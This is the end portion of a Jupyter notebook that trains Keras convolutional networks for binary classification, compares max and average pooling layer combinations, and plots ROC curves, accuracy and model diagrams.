    "        pooling_combo[0](pool_size=(2, 2)),\n",
    "        keras.layers.Conv2D(64, (2,2),padding=\"same\", activation='relu'),\n",
    "        pooling_combo[1](pool_size=(2, 2)),\n",
    "        keras.layers.Flatten(),\n",
    "        keras.layers.Dense(128, activation='relu'),\n",
    "        keras.layers.Dense(1, activation='sigmoid')\n",
    "    ])\n",
    "\n",
    "    # Compile the model\n",
    "    model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])\n",
    "    \n",
    "    print(\"----------------------\")\n",
    "    print(\"Poolings:\",pooling_combo)\n",
    "    print(\"----------------------\")\n",
    "    \n",
    "\n",
    "    # Train the model\n",
    "    history = model.fit(X_train, y_train, epochs=5)\n",
    "\n",
    "    # Get the predicted probabilities for the test data\n",
    "    y_pred = model.predict(X_test)\n",
    "\n",
    "    y_pred_binary = np.round(y_pred)\n",
    "\n",
    "    # Compute the ROC curve\n",
    "    fpr, tpr, thresholds = roc_curve(y_test, y_pred)\n",
    "    roc_auc = auc(fpr, tpr)\n",
    "    # Plot the ROC curve\n",
    "    plt.plot(fpr, tpr, label='ROC curve (AUC = %0.2f) - %s %s' % (roc_auc, pooling_combo[0], pooling_combo[1]))\n",
    "    plt.plot([0, 1], [0, 1], 'k--')  # random predictions curve\n",
    "    plt.xlim([0.0, 1.0])\n",
    "    plt.ylim([0.0, 1.0])\n",
    "    plt.xlabel('False Positive Rate or (1 - Specifity)')\n",
    "    plt.ylabel('True Positive Rate or (Sensitivity)')\n",
    "    plt.title('Receiver Operating Characteristic')\n",
    "    plt.legend(loc=\"lower right\")\n",
    "    plt.show()\n",
    "\n",
    "    print(confusion_matrix(y_test, y_pred_binary))\n",
    "    print(classification_report(y_test, y_pred_binary))\n",
    "\n",
    "    for i in ['accuracy', 'loss']:\n",
    "        acc = history.history[i]\n",
    "        epochs = range(1, len(acc) + 1)\n",
    "                       \n",
    "        plt.figure()\n",
    "        plt.plot(epochs, acc, label='Training {}'.format(i))\n",
    "        plt.title('Results for {}'.format(i))\n",
    "        plt.legend()\n",
    "        plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting visualkeras\n",
      "  Downloading visualkeras-0.0.2-py3-none-any.whl (12 kB)\n",
      "Requirement already satisfied: pillow>=6.2.0 in c:\\users\\admin\\miniconda3\\lib\\site-packages (from visualkeras) (9.0.1)\n",
      "Collecting aggdraw>=1.3.11\n",
      "  Downloading aggdraw-1.3.15-cp39-cp39-win_amd64.whl (43 kB)\n",
      "Requirement already satisfied: numpy>=1.18.1 in c:\\users\\admin\\miniconda3\\lib\\site-packages (from visualkeras) (1.22.3)\n",
      "Installing collected packages: aggdraw, visualkeras\n",
      "Successfully installed aggdraw-1.3.15 visualkeras-0.0.2\n",
      "Collecting ann_visualizer\n",
      "  Downloading ann_visualizer-2.5.tar.gz (4.7 kB)\n",
      "Building wheels for collected packages: ann-visualizer\n",
      "  Building wheel for ann-visualizer (setup.py): started\n",
      "  Building wheel for ann-visualizer (setup.py): finished with status 'done'\n",
      "  Created wheel for ann-visualizer: filename=ann_visualizer-2.5-py3-none-any.whl size=4172 sha256=61dd09c56fc5ccbd6d1726a3ce51116ae4a23ef3ecf938e6e6ae83214ce1a1b2\n",
      "  Stored in directory: c:\\users\\admin\\appdata\\local\\pip\\cache\\wheels\\2d\\d8\\86\\67f4a249969eaaa31c6df569f4ebfa84634fae3af2c627107b\n",
      "Successfully built ann-visualizer\n",
      "Installing collected packages: ann-visualizer\n",
      "Successfully installed ann-visualizer-2.5\n",
      "Collecting graphviz\n",
      "  Downloading graphviz-0.20.1-py3-none-any.whl (47 kB)\n",
      "Installing collected packages: graphviz\n",
      "Successfully installed graphviz-0.20.1\n"
     ]
    }
   ],
   "source": [
    "#!pip install visualkeras\n",
    "#!pip install ann_visualizer\n",
    "#!pip install graphviz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "WARNING:tensorflow:Compiled the loaded model, but the compiled metrics have yet to be built. `model.compile_metrics` will be empty until you train or evaluate the model.\n",
      "Serving 'path/to/model.h5' at http://localhost:8080\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "('localhost', 8080)"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import netron\n",
    "model.save(\"path/to/model.h5\")\n",
    "netron.start(\"path/to/model.h5\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tf.keras.utils.plot_model(\n",
    "model,\n",
    "to_file=\"model.png\",\n",
    "show_shapes=True,\n",
    "show_dtype=False,\n",
    "show_layer_names=True,\n",
    "rankdir=\"TB\",\n",
    "expand_nested=True,\n",
    "dpi=96,\n",
    "layer_range=None,\n",
    "show_layer_activations=True,\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<PIL.Image.Image image mode=RGBA size=704x636>"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import visualkeras\n",
    "from PIL import ImageFont\n",
    "visualkeras.layered_view(model, legend=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "for i in ['accuracy', 'loss']:\n",
    "    acc = history.history[i]\n",
    "    epochs = range(1, len(acc) + 1)\n",
    "\n",
    "    plt.figure()\n",
    "    plt.plot(epochs, acc, label='Training {}'.format(i))\n",
    "    plt.title('Results for {}'.format(i))\n",
    "    plt.legend()\n",
    "    plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "pooling_layers = [keras.layers.MaxPooling2D, keras.layers.AveragePooling2D]\n",
    "\n",
    "accuracies = []\n",
    "for pooling_layer in pooling_layers:\n",
    "    # Create a new model with the current pooling layer\n",
    "    model = keras.Sequential([\n",
    "    keras.layers.Conv2D(32, (2,2),padding=\"same\", activation='relu', input_shape=input_shape),\n",
    "    pooling_layer(pool_size=(2, 2)),\n",
    "    keras.layers.Conv2D(64, (2,2),padding=\"same\", activation='relu'),\n",
    "    pooling_layer(pool_size=(2, 2)),\n",
    "    keras.layers.Flatten(),\n",
    "    keras.layers.Dense(128, activation='relu'),\n",
    "    keras.layers.Dense(1, activation='sigmoid')\n",
    "    ])\n",
    "    # Compile and train the model\n",
    "    model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])\n",
    "    model.fit(X_train, y_train, epochs=5)\n",
    "    # Evaluate the model on the test data\n",
    "    test_loss, test_acc = model.evaluate(X_test, y_test)\n",
    "    accuracies.append(test_acc)\n",
    "    print(f'{pooling_layer.__name__} Test accuracy: {test_acc}')\n",
    "    \n",
    "# Plot the results\n",
    "plt.bar(pooling_layers, accuracies)\n",
    "plt.xlabel('Pooling Layer')\n",
    "plt.ylabel('Accuracy')\n",
    "plt.show()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(20487,)"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "y_train.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "# Define the input shape for the matrices\n",
    "input_shape = (150, 100, 1)\n",
    "\n",
    "pooling_layers = [keras.layers.MaxPooling2D, keras.layers.AveragePooling2D]\n",
    "\n",
    "# Create a list of all possible combinations of pooling layers\n",
    "combinations = list(itertools.product(pooling_layers, repeat=2))\n",
    "\n",
    "accuracies = []\n",
    "for comb in combinations:\n",
    "    # Create a new model with the current combination of pooling layers\n",
    "    model = keras.Sequential([\n",
    "        keras.layers.Conv2D(32, (2,2),padding=\"same\", activation='relu', input_shape=input_shape),\n",
    "        comb[0](pool_size=(2, 2)),\n",
    "        keras.layers.Conv2D(64, (2,2),padding=\"same\", activation='relu'),\n",
    "        comb[1](pool_size=(2, 2)),\n",
    "        keras.layers.Flatten(),\n",
    "        keras.layers.Dense(128, activation='relu'),\n",
    "        keras.layers.Dense(1, activation='softmax')\n",
    "    ])\n",
    "    # Compile and train the model\n",
    "    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])\n",
    "    model.fit(X_train, y_train, epochs=5)\n",
    "    # Evaluate the model on the test data\n",
    "    test_loss, test_acc = model.evaluate(X_test, y_test)\n",
    "    accuracies.append(test_acc)\n",
    "    print(f'{comb} Test accuracy: {test_acc}')\n",
    "\n",
    "# Plot the results\n",
    "plt.bar(range(len(combinations)), accuracies)\n",
    "plt.xticks(range(len(combinations)), combinations, rotation=90)\n",
    "plt.xlabel('Pooling Layer Combinations')\n",
    "plt.ylabel('Accuracy')\n",
    "plt.show()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'loss': [0.20774871110916138,\n",
       "  0.04583318158984184,\n",
       "  0.022237390279769897,\n",
       "  0.014348235912621021,\n",
       "  0.008562609553337097],\n",
       " 'accuracy': [0.9167276620864868,\n",
       "  0.9857958555221558,\n",
       "  0.993800938129425,\n",
       "  0.9955581426620483,\n",
       "  0.9971689581871033]}"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "history.history"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.7 ('base')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "bd97b8bffa4d3737e84826bc3d37be3046061822757ce35137ab82ad4c5a2016"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
